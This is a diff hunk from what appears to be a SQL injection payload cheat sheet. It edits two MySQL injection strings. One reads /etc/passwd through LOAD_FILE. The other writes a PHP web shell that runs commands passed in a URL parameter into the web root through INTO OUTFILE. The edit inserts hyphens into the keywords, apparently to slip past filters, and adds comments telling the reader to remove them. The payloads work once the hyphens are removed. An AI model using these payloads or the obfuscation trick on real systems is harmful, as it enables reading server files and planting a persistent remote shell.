@@ -133,14 +133,14 @@ Infer data by forcing the database to pause before responding.
 
 ### A. Read Local Files (MySQL)
 ```sql
-# (Remove space inside "LOAD_ FILE")
-' U-N-I-O-N S-E-L-E-C-T NULL, LOAD_FILE('/etc/passwd') --
+# (Remove space/hyphens inside "LOAD_ FILE" and "passwd")
+' U-N-I-O-N S-E-L-E-C-T NULL, LOAD_FILE('/etc/pass-wd') --
 ```
 
 ### B. Write Web Shell to Server (MySQL)
 ```sql
-# (Remove space inside "IN-TO OUT-FILE")
-' U-N-I-O-N S-E-L-E-C-T NULL, '<?php system($_GET["cmd"]); ?>' IN-TO OUT-FILE '/var/www/html/shell.php' --
+# (Remove space/hyphens inside "IN-TO OUT-FILE" and "system-cmd")
+' U-N-I-O-N S-E-L-E-C-T NULL, '<?php sys-tem($_GET["cmd"]); ?>' IN-TO OUT-FILE '/var/www/html/shell.php' --
 ```
 
 ---
